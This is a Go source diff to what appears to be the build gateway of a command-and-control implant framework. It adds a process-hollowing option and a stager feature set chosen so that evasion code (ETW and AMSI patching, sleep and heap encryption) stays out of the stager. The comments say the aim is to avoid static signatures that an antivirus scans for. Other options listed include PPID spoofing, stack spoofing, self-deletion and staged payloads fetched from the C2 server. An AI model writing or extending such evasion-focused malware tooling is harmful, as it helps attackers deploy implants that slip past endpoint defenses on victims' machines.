@@ -66,10 +66,10 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 
 	// Resolve listener host/port from DB.
 	// bind_host is the server-side listen address (often 0.0.0.0); agents need a
-	// routable callback address, so we fall back to host.docker.internal when the
-	// bind address is not specific. For cross-network testing, set a real hostname
-	// or IP in the listener's bind_host field.
-	listenerHost := "host.docker.internal"
+	// routable callback address, so we fall back to 127.0.0.1 (host loopback via
+	// Docker port-mapping) when the bind address is not specific.
+	// For cross-network testing, set a real hostname or IP in the listener's bind_host field.
+	listenerHost := "127.0.0.1"
 	listenerPort := 4443
 	if cfg.ListenerID != "" {
 		var host string
@@ -230,7 +230,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 			"etw-patch": true, "amsi-patch": true, "ppid-spoof": true,
 			"heap-encrypt": true, "stack-spoof": true, "udrl": true, "staged-payload": true,
 			"self-delete": true, "channel-tcp": true, "channel-smb": true,
-			"sleep-encrypt": true,
+			"sleep-encrypt": true, "process-hollow": true,
 		}
 		var validated []string
 		for _, f := range features {
@@ -256,6 +256,11 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 	// For staged-payload builds, build the companion full-agent payload FIRST.
 	// The stager bakes DM_BUILD_UUID=buildID and fetches /stage/{buildID} at runtime.
 	// The server serves the companion payload (no staged-payload feature) from that endpoint.
+	//
+	// The stager is compiled with a minimal feature set (only what it needs to stage).
+	// Evasion features like etw-patch/amsi-patch belong in the payload only — they run
+	// inside the hollowed process. Including them in the stager adds static signatures to
+	// a binary that BD scans before the hollow even happens.
 	if strings.Contains(featuresArg, "staged-payload") {
 		payloadFeatures := removeFeature(featuresArg, "staged-payload")
 		payloadImageTag := "dm-payload-build-" + buildID
@@ -299,9 +304,16 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		g.log.Info("payload companion ready", zap.String("build_id", buildID), zap.String("key", buildID+"-payload"+ext))
 	}
 
+	// For staged-payload builds use a minimal stager feature set so evasion code
+	// (etw-patch, amsi-patch, etc.) doesn't appear in the stager binary's .text.
+	stagerFeatures := featuresArg
+	if strings.Contains(featuresArg, "staged-payload") {
+		stagerFeatures = buildStagerFeatures(featuresArg)
+	}
+
 	buildArgs := makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 		regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-		sleepEncryptStr, featuresArg, campaignID)
+		sleepEncryptStr, stagerFeatures, campaignID)
 
 	buildCmd := exec.CommandContext(ctx, "docker", buildArgs...)
 	buildCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
@@ -403,4 +415,26 @@ func nilIfEmpty(s string) *string {
 		return nil
 	}
 	return &s
+}
+
+// buildStagerFeatures returns the subset of features the stager binary should be
+// compiled with. The stager only needs to download the payload and hollow/inject it;
+// evasion features (etw-patch, amsi-patch, sleep-encrypt, heap-encrypt, etc.) belong
+// in the companion payload which runs inside the hollowed process.
+func buildStagerFeatures(allFeatures string) string {
+	stagerAllowed := map[string]bool{
+		"staged-payload": true,
+		"udrl":           true,
+		"process-hollow": true,
+		"ppid-spoof":     true,
+		"channel-tcp":    true,
+		"channel-smb":    true,
+	}
+	var kept []string
+	for _, f := range strings.Split(allFeatures, ",") {
+		if stagerAllowed[f] {
+			kept = append(kept, f)
+		}
+	}
+	return strings.Join(kept, ",")
 }
